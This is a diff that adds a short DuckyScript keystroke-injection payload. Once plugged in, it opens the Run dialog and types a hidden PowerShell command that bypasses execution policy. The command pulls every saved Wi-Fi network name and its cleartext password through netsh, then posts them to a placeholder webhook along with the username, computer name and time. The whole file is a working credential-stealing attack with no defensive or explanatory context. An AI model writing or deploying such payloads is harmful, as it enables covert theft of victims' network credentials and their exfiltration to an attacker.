@@ -1,0 +1,5 @@
+DELAY 2500
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$hook='WEBHOOK HERE'; $data=''; (netsh wlan show profiles) -match ':(.+)$' | % { $name = $Matches[1].Trim(); $prof = netsh wlan show profile name=`"$name`" key=clear; if ($prof -match 'Key Content\W+:\s*(.+)$') { $pass = $Matches[1].Trim(); $data += \"SSID: $name`nPass: $pass`n`n\" } }; if ($data) { $payload = @{content=\"WiFi Dump`n`n$data`nUser: $env:USERNAME`nPC: $env:COMPUTERNAME`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')\"}; Invoke-RestMethod -Uri $hook -Method Post -Body ($payload|ConvertTo-Json) -ContentType 'application/json'}"
+ENTER
